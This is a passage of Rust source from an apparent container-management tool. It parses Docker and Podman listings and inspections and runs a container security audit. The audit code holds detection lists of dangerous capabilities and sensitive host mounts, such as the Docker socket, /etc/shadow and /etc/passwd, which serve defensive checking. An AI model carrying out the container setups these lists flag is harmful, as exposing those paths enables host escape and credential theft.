) -> CoreResult<DockerCollection<ContainerStats>> {
    let (rows, truncated) = json_rows(output, "container stats")?;
    let mut items = Vec::with_capacity(rows.len());
    for row in rows {
        let id = row
            .get("ID")
            .or_else(|| row.get("Container"))
            .and_then(Value::as_str)
            .ok_or_else(|| CoreError::validation("container stats", "missing container ID"))?;
        let identity = ContainerIdentity::new(runtime, id.to_owned())?;
        items.push(ContainerStats {
            identity,
            name: json_text(&row, "Name", 256),
            cpu_percent: json_text(&row, "CPUPerc", 64),
            memory_usage: json_text(&row, "MemUsage", 128),
            memory_percent: json_text(&row, "MemPerc", 64),
            network_io: json_text(&row, "NetIO", 128),
            block_io: json_text(&row, "BlockIO", 128),
            pids: row
                .get("PIDs")
                .and_then(|value| value.as_u64().or_else(|| value.as_str()?.parse().ok())),
        });
    }
    items.sort_by(|left, right| left.identity.cmp(&right.identity));
    Ok(DockerCollection { items, truncated })
}

fn parse_images(
    runtime: ContainerRuntime,
    output: &str,
) -> CoreResult<DockerCollection<ContainerImage>> {
    let (rows, truncated) = json_rows(output, "container images")?;
    let mut items = rows
        .into_iter()
        .map(|row| ContainerImage {
            runtime,
            // Podman names these fields in lowercase where Docker uses
            // PascalCase, the same split the network listing has.
            id: json_alias_text(&row, &["ID", "Id", "id"], 256),
            repository: json_alias_text(&row, &["Repository", "repository"], 1_024),
            tag: json_alias_text(&row, &["Tag", "tag"], 512),
            digest: json_alias_text(&row, &["Digest", "digest"], 256),
            // Docker prints a formatted date and a human size; Podman prints a
            // Unix timestamp and a byte count, as numbers. Left raw, the
            // columns read "1776383606" and "8104044", so both are turned into
            // the thing Docker would have written.
            created_at: image_created_text(&row),
            size: image_size_text(&row),
        })
        .collect::<Vec<_>>();
    items.sort_by(|left, right| {
        left.repository
            .to_lowercase()
            .cmp(&right.repository.to_lowercase())
            .then_with(|| left.tag.cmp(&right.tag))
            .then_with(|| left.id.cmp(&right.id))
    });
    Ok(DockerCollection { items, truncated })
}

fn parse_networks(
    runtime: ContainerRuntime,
    output: &str,
) -> CoreResult<DockerCollection<DockerNetwork>> {
    let (rows, truncated) = json_rows(output, "container networks")?;
    let mut seen = BTreeSet::new();
    let mut items = Vec::with_capacity(rows.len());
    for row in rows {
        // Podman prints this listing in snake_case where Docker uses
        // PascalCase, so each field is read from whichever name is there.
        let id = required_json_alias(&row, &["ID", "id"])?;
        validate_runtime_hex_id("container network id", &id)?;
        if !seen.insert(id.clone()) {
            return Err(CoreError::validation(
                "container networks",
                "runtime returned a duplicate network id",
            ));
        }
        let name = required_json_alias(&row, &["Name", "name"])?;
        items.push(DockerNetwork {
            runtime,
            id,
            name,
            driver: json_alias_text(&row, &["Driver", "driver"], 128),
            // Podman has no scope: its networks are always local to the host,
            // and saying so is better than an empty column.
            scope: first_non_empty(&[
                json_alias_text(&row, &["Scope", "scope"], 128),
                match runtime {
                    ContainerRuntime::Podman => "local".to_owned(),
                    ContainerRuntime::Docker => String::new(),
                },
            ]),
            internal: json_alias_bool(&row, &["Internal", "internal"]),
            ipv6: json_alias_bool(&row, &["IPv6", "ipv6_enabled"]),
        });
    }
    items.sort_by(|left, right| {
        left.name
            .to_lowercase()
            .cmp(&right.name.to_lowercase())
            .then_with(|| left.id.cmp(&right.id))
    });
    Ok(DockerCollection { items, truncated })
}

fn parse_volumes(
    runtime: ContainerRuntime,
    output: &str,
) -> CoreResult<DockerCollection<DockerVolume>> {
    let (rows, truncated) = json_rows(output, "container volumes")?;
    let mut seen = BTreeSet::new();
    let mut items = Vec::with_capacity(rows.len());
    for row in rows {
        let name = required_json_text(&row, "Name")?;
        validate_volume_name(&name)?;
        if !seen.insert(name.clone()) {
            return Err(CoreError::validation(
                "container volumes",
                "runtime returned a duplicate volume name",
            ));
        }
        items.push(DockerVolume {
            runtime,
            name,
            driver: json_text(&row, "Driver", 128),
            mountpoint: json_text(&row, "Mountpoint", MAX_CELL_CHARS),
            scope: json_text(&row, "Scope", 128),
            labels: json_text(&row, "Labels", MAX_CELL_CHARS),
        });
    }
    items.sort_by_key(|left| left.name.to_lowercase());
    Ok(DockerCollection { items, truncated })
}

fn parse_network_inspection(
    expected: &DockerNetwork,
    output: &str,
) -> CoreResult<DockerNetworkInspection> {
    if output.len() > MAX_INSPECT_BYTES {
        return Err(CoreError::validation(
            "container network inspection",
            "runtime response exceeds the 1 MB typed inspection boundary",
        ));
    }
    validate_runtime_hex_id("container network id", &expected.id)?;
    let value: Value = serde_json::from_str(json_array_body(output)).map_err(|error| {
        CoreError::validation("container network inspection", error.to_string())
    })?;
    let records = value.as_array().ok_or_else(|| {
        CoreError::validation("container network inspection", "expected a JSON array")
    })?;
    if records.len() != 1 {
        return Err(CoreError::validation(
            "container network inspection",
            "runtime must return exactly one network record",
        ));
    }
    let record = records[0].as_object().ok_or_else(|| {
        CoreError::validation("container network inspection", "expected a JSON object")
    })?;
    let id = required_json_text(record, "Id")?;
    validate_runtime_hex_id("container network id", &id)?;
    if id != expected.id {
        return Err(CoreError::validation(
            "container network inspection",
            "runtime returned a different network identity",
        ));
    }

    let ipam_object = record.get("IPAM").and_then(Value::as_object);
    let ipam_driver = ipam_object
        .map(|ipam| json_text(ipam, "Driver", 128))
        .unwrap_or_default();
    let ipam_rows = ipam_object
        .and_then(|ipam| ipam.get("Config"))
        .and_then(Value::as_array)
        .map(Vec::as_slice)
        .unwrap_or_default();
    if ipam_rows.len() > MAX_NETWORK_METADATA_ENTRIES {
        return Err(CoreError::validation(
            "container network IPAM",
            "runtime returned too many IPAM records",
        ));
    }
    let mut ipam = Vec::with_capacity(ipam_rows.len());
    for row in ipam_rows {
        let row = row.as_object().ok_or_else(|| {
            CoreError::validation("container network IPAM", "expected a JSON object")
        })?;
        ipam.push(DockerNetworkIpamConfig {
            subnet: json_text(row, "Subnet", 256),
            gateway: json_text(row, "Gateway", 256),
            ip_range: json_text(row, "IPRange", 256),
        });
    }

    let attachment_rows = record
        .get("Containers")
        .and_then(Value::as_object)
        .cloned()
        .unwrap_or_default();
    if attachment_rows.len() > MAX_COLLECTION_ROWS {
        return Err(CoreError::validation(
            "container network attachments",
            "runtime returned too many attached containers",
        ));
    }
    let mut attachments = Vec::with_capacity(attachment_rows.len());
    for (container_id, value) in attachment_rows {
        validate_runtime_hex_id("attached container id", &container_id)?;
        let row = value.as_object().ok_or_else(|| {
            CoreError::validation("container network attachments", "expected a JSON object")
        })?;
        attachments.push(DockerNetworkAttachment {
            container_id,
            name: json_text(row, "Name", 256),
            endpoint_id: json_text(row, "EndpointID", 256),
            mac_address: json_text(row, "MacAddress", 128),
            ipv4_address: json_text(row, "IPv4Address", 256),
            ipv6_address: json_text(row, "IPv6Address", 256),
        });
    }
    attachments.sort_by(|left, right| {
        left.name
            .to_lowercase()
            .cmp(&right.name.to_lowercase())
            .then_with(|| left.container_id.cmp(&right.container_id))
    });

    Ok(DockerNetworkInspection {
        network: DockerNetwork {
            runtime: expected.runtime,
            id,
            name: required_json_text(record, "Name")?,
            driver: json_text(record, "Driver", 128),
            scope: json_text(record, "Scope", 128),
            internal: json_bool(record, "Internal"),
            ipv6: json_bool(record, "EnableIPv6"),
        },
        attachable: json_bool(record, "Attachable"),
        ingress: json_bool(record, "Ingress"),
        ipam_driver,
        ipam,
        attachments,
        options: bounded_string_map(record.get("Options"), "container network options")?,
        labels: bounded_string_map(record.get("Labels"), "container network labels")?,
    })
}

fn parse_volume_inspection(
    expected: &DockerVolume,
    output: &str,
) -> CoreResult<DockerVolumeInspection> {
    if output.len() > MAX_INSPECT_BYTES {
        return Err(CoreError::validation(
            "container volume inspection",
            "runtime response exceeds the 1 MB typed inspection boundary",
        ));
    }
    validate_volume_name(&expected.name)?;
    let value: Value = serde_json::from_str(json_array_body(output))
        .map_err(|error| CoreError::validation("container volume inspection", error.to_string()))?;
    let records = value.as_array().ok_or_else(|| {
        CoreError::validation("container volume inspection", "expected a JSON array")
    })?;
    if records.len() != 1 {
        return Err(CoreError::validation(
            "container volume inspection",
            "runtime must return exactly one volume record",
        ));
    }
    let record = records[0].as_object().ok_or_else(|| {
        CoreError::validation("container volume inspection", "expected a JSON object")
    })?;
    let name = required_json_text(record, "Name")?;
    validate_volume_name(&name)?;
    if name != expected.name {
        return Err(CoreError::validation(
            "container volume inspection",
            "runtime returned a different volume identity",
        ));
    }
    let labels = bounded_string_map(record.get("Labels"), "container volume labels")?;
    Ok(DockerVolumeInspection {
        volume: DockerVolume {
            runtime: expected.runtime,
            name,
            driver: json_text(record, "Driver", 128),
            mountpoint: json_text(record, "Mountpoint", MAX_CELL_CHARS),
            scope: json_text(record, "Scope", 128),
            labels: expected.labels.clone(),
        },
        created_at: json_text(record, "CreatedAt", 256),
        options: bounded_string_map(record.get("Options"), "container volume options")?,
        labels,
    })
}

fn parse_image_inspection(
    expected: &ContainerImage,
    output: &str,
) -> CoreResult<DockerImageInspection> {
    if output.len() > MAX_INSPECT_BYTES {
        return Err(CoreError::validation(
            "container image inspection",
            "runtime response exceeds the 1 MB typed inspection boundary",
        ));
    }
    validate_image_id(&expected.id)?;
    let value: Value = serde_json::from_str(json_array_body(output))
        .map_err(|error| CoreError::validation("container image inspection", error.to_string()))?;
    let records = value.as_array().ok_or_else(|| {
        CoreError::validation("container image inspection", "expected a JSON array")
    })?;
    if records.len() != 1 {
        return Err(CoreError::validation(
            "container image inspection",
            "runtime must return exactly one image record",
        ));
    }
    let record = records[0].as_object().ok_or_else(|| {
        CoreError::validation("container image inspection", "expected a JSON object")
    })?;
    let id = required_json_text(record, "Id")?;
    validate_image_id(&id)?;
    // The two forms of the same id compare equal: the listing and the
    // inspection do not always agree on whether the `sha256:` prefix is there.
    if bare_image_id(&id) != bare_image_id(&expected.id) {
        return Err(CoreError::validation(
            "container image inspection",
            "runtime returned a different image identity",
        ));
    }

    let config = record.get("Config").and_then(Value::as_object);
    let read_config_list = |key: &str| {
        config
            .map(|config| bounded_text_list(config.get(key)))
            .unwrap_or_default()
    };

    Ok(DockerImageInspection {
        image: ContainerImage {
            runtime: expected.runtime,
            id,
            repository: expected.repository.clone(),
            tag: expected.tag.clone(),
            digest: expected.digest.clone(),
            created_at: json_text(record, "Created", 512),
            size: expected.size.clone(),
        },
        architecture: json_text(record, "Architecture", 128),
        os: json_text(record, "Os", 128),
        author: json_text(record, "Author", 512),
        user: config
            .map(|config| json_text(config, "User", 256))
            .unwrap_or_default(),
        entrypoint: read_config_list("Entrypoint"),
        command: read_config_list("Cmd"),
        working_dir: config
            .map(|config| json_text(config, "WorkingDir", 1_024))
            .unwrap_or_default(),
        environment: read_config_list("Env"),
        // Both of these are JSON objects whose keys carry the value and whose
        // values are empty objects, so only the keys are worth reading.
        exposed_ports: config
            .map(|config| bounded_object_keys(config.get("ExposedPorts")))
            .unwrap_or_default(),
        declared_volumes: config
            .map(|config| bounded_object_keys(config.get("Volumes")))
            .unwrap_or_default(),
        labels: config
            .map(|config| bounded_string_map(config.get("Labels"), "container image labels"))
            .transpose()?
            .unwrap_or_default(),
        layers: record
            .get("RootFS")
            .and_then(Value::as_object)
            .map(|root| bounded_text_list(root.get("Layers")))
            .unwrap_or_default(),
        repo_tags: bounded_text_list(record.get("RepoTags")),
        repo_digests: bounded_text_list(record.get("RepoDigests")),
        history: Vec::new(),
    })
}

fn parse_image_history(output: &str) -> CoreResult<Vec<DockerImageHistoryStep>> {
    let (rows, _) = json_rows(output, "container image history")?;
    Ok(rows
        .into_iter()
        .map(|row| DockerImageHistoryStep {
            // A layer that came from a pulled image has no id of its own, and
            // the runtime prints `<missing>` there. That is a real answer, so
            // it is kept rather than blanked.
            id: json_alias_text(&row, &["ID", "Id", "id"], 256),
            created_at: json_alias_text(&row, &["CreatedAt", "Created", "created"], 512),
            created_by: json_alias_text(&row, &["CreatedBy", "createdby"], 8_192),
            size: json_alias_text(&row, &["Size", "size"], 128),
            comment: json_alias_text(&row, &["Comment", "comment"], 1_024),
        })
        .collect())
}

fn bare_image_id(value: &str) -> &str {
    value.strip_prefix("sha256:").unwrap_or(value)
}

/// When the image was built, however the runtime chose to say it.
///
/// Docker writes a formatted date under `CreatedAt`. Podman writes Unix
/// seconds under `Created`, as a number — which reads as a meaningless run of
/// digits unless it is turned back into a date.
fn image_created_text(row: &Map<String, Value>) -> String {
    for key in ["CreatedAt", "createdat"] {
        let text = json_text(row, key, 512);
        if !text.is_empty() {
            return text;
        }
    }
    match row.get("Created").or_else(|| row.get("created")) {
        Some(Value::String(value)) => sanitize_line(value, 512),
        Some(Value::Number(value)) => value
            .as_i64()
            .and_then(|seconds| DateTime::<Utc>::from_timestamp(seconds, 0))
            .map(|moment| moment.format("%Y-%m-%d %H:%M:%S UTC").to_string())
            .unwrap_or_default(),
        _ => String::new(),
    }
}

/// How big the image is, however the runtime chose to say it.
///
/// Docker writes "12.2MB"; Podman writes the byte count as a number. A raw
/// byte count in a size column is a number nobody reads, so it is rendered the
/// way the other runtime would have.
fn image_size_text(row: &Map<String, Value>) -> String {
    match row.get("Size").or_else(|| row.get("size")) {
        Some(Value::String(value)) => sanitize_line(value, 128),
        Some(Value::Number(value)) => value.as_u64().map(human_bytes).unwrap_or_default(),
        _ => String::new(),
    }
}

fn human_bytes(value: u64) -> String {
    const UNITS: [&str; 5] = ["B", "kB", "MB", "GB", "TB"];
    let mut size = value as f64;
    let mut unit = 0;
    while size >= 1000.0 && unit + 1 < UNITS.len() {
        size /= 1000.0;
        unit += 1;
    }
    if unit == 0 {
        format!("{value}B")
    } else {
        format!("{size:.1}{}", UNITS[unit])
    }
}

/// A JSON array of strings, bounded the same way every other runtime list is.
/// Anything that is not an array reads as empty rather than failing: these are
/// optional configuration fields, and `null` is how a runtime says "unset".
fn bounded_text_list(value: Option<&Value>) -> Vec<String> {
    value
        .and_then(Value::as_array)
        .map(|rows| {
            rows.iter()
                .take(MAX_NETWORK_METADATA_ENTRIES)
                .map(|row| value_text(row, 8_192))
                .collect()
        })
        .unwrap_or_default()
}

/// The keys of a JSON object, for the fields where the runtime puts the answer
/// in the key and leaves the value empty (`ExposedPorts`, `Volumes`).
fn bounded_object_keys(value: Option<&Value>) -> Vec<String> {
    value
        .and_then(Value::as_object)
        .map(|object| {
            object
                .keys()
                .take(MAX_NETWORK_METADATA_ENTRIES)
                .map(|key| sanitize_line(key, 256))
                .filter(|key| !key.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

fn bounded_string_map(
    value: Option<&Value>,
    subject: &'static str,
) -> CoreResult<BTreeMap<String, String>> {
    let Some(value) = value else {
        return Ok(BTreeMap::new());
    };
    if value.is_null() {
        return Ok(BTreeMap::new());
    }
    let object = value
        .as_object()
        .ok_or_else(|| CoreError::validation(subject, "expected a JSON object"))?;
    if object.len() > MAX_NETWORK_METADATA_ENTRIES {
        return Err(CoreError::validation(
            subject,
            "runtime returned too many metadata entries",
        ));
    }
    let mut result = BTreeMap::new();
    for (key, value) in object {
        let key = sanitize_line(key, 256);
        if key.is_empty() || result.contains_key(&key) {
            return Err(CoreError::validation(
                subject,
                "metadata keys must remain unique and non-empty after sanitization",
            ));
        }
        result.insert(key, value_text(value, 1_024));
    }
    Ok(result)
}

fn parse_compose_projects(
    runtime: ContainerRuntime,
    output: &str,
) -> CoreResult<DockerCollection<DockerComposeProject>> {
    if output.len() > MAX_INSPECT_BYTES {
        return Err(CoreError::validation(
            "compose projects",
            "runtime response exceeds the 1 MB typed inventory boundary",
        ));
    }
    let value: Value = serde_json::from_str(json_array_body(output))
        .map_err(|error| CoreError::validation("compose projects", error.to_string()))?;
    let rows = value
        .as_array()
        .ok_or_else(|| CoreError::validation("compose projects", "expected a JSON array"))?;
    let truncated = rows.len() > MAX_COLLECTION_ROWS;
    let mut seen = BTreeSet::new();
    let mut items = Vec::with_capacity(rows.len().min(MAX_COLLECTION_ROWS));
    for row in rows.iter().take(MAX_COLLECTION_ROWS) {
        let row = row
            .as_object()
            .ok_or_else(|| CoreError::validation("compose projects", "expected a JSON object"))?;
        let name = required_json_text(row, "Name")?;
        validate_compose_project_name(&name)?;
        if !seen.insert(name.clone()) {
            return Err(CoreError::validation(
                "compose projects",
                "runtime returned a duplicate project name",
            ));
        }
        let status = json_text(row, "Status", 256);
        let running = compose_status_count(&status, "running");
        let stopped = compose_status_count(&status, "exited")
            .saturating_add(compose_status_count(&status, "stopped"));
        items.push(DockerComposeProject {
            runtime,
            name,
            status,
            config_files: json_text(row, "ConfigFiles", MAX_CELL_CHARS),
            services: running.saturating_add(stopped),
            running,
            stopped,
        });
    }
    items.sort_by(|left, right| left.name.cmp(&right.name));
    Ok(DockerCollection { items, truncated })
}

fn compose_status_count(status: &str, label: &str) -> u64 {
    let status = status.to_ascii_lowercase();
    let marker = format!("{label}(");
    status
        .find(&marker)
        .and_then(|start| {
            status[start + marker.len()..]
                .split_once(')')
                .map(|(count, _)| count)
        })
        .and_then(|count| count.parse::<u64>().ok())
        .unwrap_or(0)
}

fn parse_inspection(expected: &ContainerIdentity, output: &str) -> CoreResult<ContainerInspection> {
    if output.len() > MAX_INSPECT_BYTES {
        return Err(CoreError::validation(
            "container inspection",
            "runtime response exceeds the 1 MB typed inspection boundary",
        ));
    }
    let value: Value = serde_json::from_str(json_array_body(output))
        .map_err(|error| CoreError::validation("container inspection", error.to_string()))?;
    let object = value
        .as_array()
        .and_then(|items| items.first())
        .and_then(Value::as_object)
        .ok_or_else(|| CoreError::validation("container inspection", "expected one JSON object"))?;
    let observed_id = object
        .get("Id")
        .and_then(Value::as_str)
        .ok_or_else(|| CoreError::validation("container inspection", "missing container Id"))?;
    validate_container_id(observed_id)?;
    if observed_id != expected.id() {
        return Err(CoreError::validation(
            "container inspection",
            "runtime returned a different container identity",
        ));
    }
    let pointer = |path: &str, maximum| {
        value
            .pointer(&format!("/0{path}"))
            .map(|entry| value_text(entry, maximum))
            .unwrap_or_default()
    };
    let fields = [
        ("镜像", "/Config/Image"),
        ("创建时间", "/Created"),
        ("平台", "/Platform"),
        ("存储驱动", "/Driver"),
        ("状态", "/State/Status"),
        ("健康状态", "/State/Health/Status"),
        ("PID", "/State/Pid"),
        ("重启次数", "/RestartCount"),
        ("运行用户", "/Config/User"),
        ("工作目录", "/Config/WorkingDir"),
        ("特权模式", "/HostConfig/Privileged"),
        ("只读根文件系统", "/HostConfig/ReadonlyRootfs"),
        ("网络模式", "/HostConfig/NetworkMode"),
        ("PID 模式", "/HostConfig/PidMode"),
        ("IPC 模式", "/HostConfig/IpcMode"),
    ]
    .into_iter()
    .map(|(label, path)| ContainerInspectionField {
        label: label.to_owned(),
        value: pointer(path, MAX_CELL_CHARS),
    })
    .collect();
    let mounts = object
        .get("Mounts")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .take(256)
        .filter_map(Value::as_object)
        .map(|mount| ContainerMount {
            kind: json_text(mount, "Type", 64),
            source: json_text(mount, "Source", MAX_CELL_CHARS),
            destination: json_text(mount, "Destination", MAX_CELL_CHARS),
            mode: json_text(mount, "Mode", 256),
            read_write: mount.get("RW").and_then(Value::as_bool).unwrap_or(false),
        })
        .collect();
    let networks = value
        .pointer("/0/NetworkSettings/Networks")
        .and_then(Value::as_object)
        .into_iter()
        .flat_map(BTreeMapView::from_map)
        .take(128)
        .filter_map(|(name, network)| {
            let network = network.as_object()?;
            Some(ContainerNetwork {
                name: sanitize_line(name, 256),
                network_id: json_text(network, "NetworkID", 256),
                endpoint_id: json_text(network, "EndpointID", 256),
                mac_address: json_text(network, "MacAddress", 128),
                ipv4_address: json_text(network, "IPAddress", 128),
                ipv6_address: json_text(network, "GlobalIPv6Address", 128),
            })
        })
        .collect();
    Ok(ContainerInspection {
        identity: expected.clone(),
        name: object
            .get("Name")
            .and_then(Value::as_str)
            .map(|name| sanitize_line(name.trim_start_matches('/'), 256))
            .unwrap_or_default(),
        fields,
        mounts,
        networks,
    })
}

#[derive(Debug)]
struct SecurityInspection {
    identity: ContainerIdentity,
    name: String,
    image: String,
    running: bool,
    privileged: bool,
    host_pid: bool,
    host_ipc: bool,
    network_mode: String,
    health: String,
    memory_limit: Option<u64>,
    dangerous_caps: Vec<String>,
    mounts: Vec<ContainerMount>,
    exposed_ports: Vec<String>,
}

fn security_audit_command(
    runtime: ContainerRuntime,
    identities: &[ContainerIdentity],
) -> CoreResult<String> {
    if identities.is_empty() || identities.len() > MAX_COLLECTION_ROWS {
        return Err(CoreError::validation(
            "Docker security audit",
            "requires between 1 and 1000 container identities",
        ));
    }
    if identities
        .iter()
        .any(|identity| identity.runtime() != runtime)
    {
        return Err(CoreError::validation(
            "Docker security audit",
            "all container identities must use the selected runtime",
        ));
    }
    let arguments = identities
        .iter()
        .map(|identity| {
            validate_container_id(identity.id())?;
            Ok(shq(identity.id()))
        })
        .collect::<CoreResult<Vec<_>>>()?
        .join(" ");
    Ok(format!(
        "{} inspect --type container {arguments}",
        runtime.command()
    ))
}

fn parse_security_inspections(
    runtime: ContainerRuntime,
    expected: &[ContainerIdentity],
    output: &str,
) -> CoreResult<Vec<SecurityInspection>> {
    if output.len() > MAX_SECURITY_AUDIT_BYTES {
        return Err(CoreError::validation(
            "Docker security audit",
            "runtime response exceeds the 16 MiB audit boundary",
        ));
    }
    let rows = serde_json::from_str::<Value>(json_array_body(output))
        .map_err(|error| CoreError::validation("Docker security audit", error.to_string()))?;
    let rows = rows
        .as_array()
        .ok_or_else(|| CoreError::validation("Docker security audit", "expected a JSON array"))?;
    if rows.len() != expected.len() {
        return Err(CoreError::validation(
            "Docker security audit",
            format!(
                "expected {} container records but received {}",
                expected.len(),
                rows.len()
            ),
        ));
    }
    let expected_ids = expected
        .iter()
        .map(|identity| identity.id().to_owned())
        .collect::<BTreeSet<_>>();
    let mut observed_ids = BTreeSet::new();
    let mut inspected = Vec::with_capacity(rows.len());
    for row in rows {
        let object = row.as_object().ok_or_else(|| {
            CoreError::validation("Docker security audit", "inspect row is not an object")
        })?;
        let id = object.get("Id").and_then(Value::as_str).ok_or_else(|| {
            CoreError::validation("Docker security audit", "inspect row has no Id")
        })?;
        validate_container_id(id)?;
        if !expected_ids.contains(id) || !observed_ids.insert(id.to_owned()) {
            return Err(CoreError::validation(
                "Docker security audit",
                "runtime returned an unexpected or duplicate container identity",
            ));
        }
        let pointer = |path: &str| row.pointer(path);
        let dangerous_caps = pointer("/HostConfig/CapAdd")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .filter_map(Value::as_str)
            .filter_map(normalize_dangerous_capability)
            .take(128)
            .collect::<Vec<_>>();
        let mounts = object
            .get("Mounts")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .take(256)
            .filter_map(Value::as_object)
            .map(|mount| ContainerMount {
                kind: json_text(mount, "Type", 64),
                source: json_text(mount, "Source", MAX_CELL_CHARS),
                destination: json_text(mount, "Destination", MAX_CELL_CHARS),
                mode: json_text(mount, "Mode", 256),
                read_write: mount.get("RW").and_then(Value::as_bool).unwrap_or(false),
            })
            .collect::<Vec<_>>();
        let exposed_ports = pointer("/NetworkSettings/Ports")
            .and_then(Value::as_object)
            .into_iter()
            .flat_map(BTreeMapView::from_map)
            .flat_map(|(private, bindings)| {
                bindings
                    .as_array()
                    .into_iter()
                    .flatten()
                    .filter_map(move |binding| {
                        let binding = binding.as_object()?;
                        let ip = json_text(binding, "HostIp", 128);
                        let port = json_text(binding, "HostPort", 32);
                        ((!port.is_empty()) && (ip.is_empty() || ip == "0.0.0.0" || ip == "::"))
                            .then(|| sanitize_line(&format!("{port} → {private}"), 256))
                    })
            })
            .take(256)
            .collect::<Vec<_>>();
        inspected.push(SecurityInspection {
            identity: ContainerIdentity::new(runtime, id)?,
            name: pointer("/Name")
                .and_then(Value::as_str)
                .map(|name| sanitize_line(name.trim_start_matches('/'), 256))
                .unwrap_or_default(),
            image: pointer("/Config/Image")
                .and_then(Value::as_str)
                .map(|image| sanitize_line(image, 1_024))
                .unwrap_or_default(),
            running: pointer("/State/Running")
                .and_then(Value::as_bool)
                .unwrap_or(false),
            privileged: pointer("/HostConfig/Privileged")
                .and_then(Value::as_bool)
                .unwrap_or(false),
            host_pid: pointer("/HostConfig/PidMode").and_then(Value::as_str) == Some("host"),
            host_ipc: pointer("/HostConfig/IpcMode").and_then(Value::as_str) == Some("host"),
            network_mode: pointer("/HostConfig/NetworkMode")
                .and_then(Value::as_str)
                .map(|mode| sanitize_line(mode, 256))
                .unwrap_or_default(),
            health: pointer("/State/Health/Status")
                .and_then(Value::as_str)
                .map(|health| sanitize_line(health, 64))
                .unwrap_or_default(),
            memory_limit: pointer("/HostConfig/Memory").and_then(Value::as_u64),
            dangerous_caps,
            mounts,
            exposed_ports,
        });
    }
    if observed_ids != expected_ids {
        return Err(CoreError::validation(
            "Docker security audit",
            "runtime response did not contain the exact requested identity set",
        ));
    }
    inspected.sort_by(|left, right| left.identity.cmp(&right.identity));
    Ok(inspected)
}

fn normalize_dangerous_capability(value: &str) -> Option<String> {
    const DANGEROUS: &[&str] = &[
        "ALL",
        "SYS_ADMIN",
        "SYS_MODULE",
        "SYS_PTRACE",
        "SYS_RAWIO",
        "SYS_BOOT",
        "NET_ADMIN",
        "DAC_READ_SEARCH",
        "DAC_OVERRIDE",
        "BPF",
        "SYS_CHROOT",
    ];
    let upper = value.trim().to_ascii_uppercase();
    let bare = upper.strip_prefix("CAP_").unwrap_or(&upper);
    DANGEROUS
        .contains(&bare)
        .then(|| sanitize_line(value.trim(), 64))
}

fn build_security_audit(
    runtime: ContainerRuntime,
    inspected: Vec<SecurityInspection>,
    inventory_truncated: bool,
) -> DockerSecurityAudit {
    const DANGEROUS_MOUNTS: &[&str] = &[
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/proc",
        "/sys",
        "/etc/shadow",
        "/etc/passwd",
        "/root",
        "/dev",
        "/boot",
        "/var/run/containerd",
        "/run/containerd",
    ];
    let containers_scanned = inspected.len();
    let mut findings = Vec::new();
    let mut push = |container: &SecurityInspection,
                    severity: DockerSecuritySeverity,
                    category: DockerSecurityCategory,
                    description: String,
                    remediation: &'static str| {
        if findings.len() < MAX_SECURITY_FINDINGS {
            findings.push(DockerSecurityFinding {
                id: format!(
                    "{}:{}:{}:{}",
                    container.identity.stable_key(),
                    category_id(category),
                    severity_id(severity),
                    findings.len() + 1
                ),
                severity,
                category,
                container: container.identity.clone(),
                container_name: container.name.clone(),
                description: sanitize_line(&description, MAX_CELL_CHARS),
                remediation: remediation.to_owned(),
            });
        }
    };
    for container in &inspected {
        let display = if container.name.is_empty() {
            container.identity.id()
        } else {
            &container.name
        };
        if container.privileged {
            push(
                container,
                DockerSecuritySeverity::Critical,
                DockerSecurityCategory::Privileged,
                format!("容器 {display} 以特权模式运行，拥有接近宿主机的设备与内核访问能力"),
                "移除 --privileged，仅使用业务必需的最小 capabilities。",
            );
        }
        if container.host_pid {
            push(
                container,
                DockerSecuritySeverity::Critical,
                DockerSecurityCategory::Privileged,
                format!("容器 {display} 共享宿主机 PID 命名空间"),
                "移除 --pid=host，恢复私有 PID 命名空间。",
            );
        }
        if container.host_ipc {
            push(
                container,
                DockerSecuritySeverity::High,
                DockerSecurityCategory::Privileged,
                format!("容器 {display} 共享宿主机 IPC 命名空间"),
                "移除 --ipc=host，恢复私有 IPC 命名空间。",
            );
        }
        if !container.dangerous_caps.is_empty() {
            let has_all = container
                .dangerous_caps
                .iter()
                .any(|capability| capability.trim_start_matches("CAP_") == "ALL");
            push(
                container,
                if has_all {
                    DockerSecuritySeverity::Critical
                } else {
                    DockerSecuritySeverity::High
                },
                DockerSecurityCategory::Capabilities,
                format!(
                    "容器 {display} 获得危险 capabilities：{}",
                    container.dangerous_caps.join(", ")
                ),
                "按最小权限移除 SYS_ADMIN、SYS_MODULE、SYS_PTRACE、NET_ADMIN 等非必需能力。",
            );
        }
        for mount in &container.mounts {
            if DANGEROUS_MOUNTS
                .iter()
                .any(|prefix| path_has_prefix(&mount.source, prefix))
            {
                let socket = mount.source.ends_with("docker.sock");
                push(
                    container,
                    if socket {
                        DockerSecuritySeverity::Critical
                    } else {
                        DockerSecuritySeverity::High
                    },
                    DockerSecurityCategory::Mount,
                    format!(
                        "容器 {display} 挂载敏感宿主路径 {} → {}{}",
                        mount.source,
                        mount.destination,
                        if mount.read_write {
                            "（可写）"
                        } else {
                            "（只读）"
                        }
                    ),
                    if socket {
                        "不要向容器暴露 Docker Socket；改用受限代理或明确授权的管理边界。"
                    } else {
                        "移除敏感 bind mount，优先使用命名卷或 tmpfs，并尽可能设为只读。"
                    },
                );
            }
        }
        if container.network_mode == "host" {
            push(
                container,
                DockerSecuritySeverity::High,
                DockerSecurityCategory::Network,
                format!("容器 {display} 与宿主机共享网络栈"),
                "改用 bridge 或受控自定义网络，仅在经过审查的场景使用 host 网络。",
            );
        }
        for port in &container.exposed_ports {
            push(
                container,
                DockerSecuritySeverity::Medium,
                DockerSecurityCategory::Network,
                format!("容器 {display} 向所有接口暴露端口 {port}"),
                "将发布端口绑定到明确接口或回环地址，并通过防火墙限制来源。",
            );
        }
        if !container.image.is_empty()
            && (container.image.ends_with(":latest") || !container.image.contains(':'))
        {
            push(
                container,
                DockerSecuritySeverity::Medium,
                DockerSecurityCategory::Image,
                format!("容器 {display} 使用未固定版本的镜像 {}", container.image),
                "将镜像固定到明确版本或不可变 digest，并纳入镜像来源校验。",
            );
        }
        if container.running && container.memory_limit == Some(0) {
            push(
                container,
                DockerSecuritySeverity::Low,
                DockerSecurityCategory::ResourceLimits,
                format!("运行中的容器 {display} 未配置内存上限"),
                "设置符合业务负载的 --memory 上限并监控 OOM 行为。",
            );
        }
        if container.running && container.health.eq_ignore_ascii_case("unhealthy") {
            push(
                container,
                DockerSecuritySeverity::High,
                DockerSecurityCategory::Health,
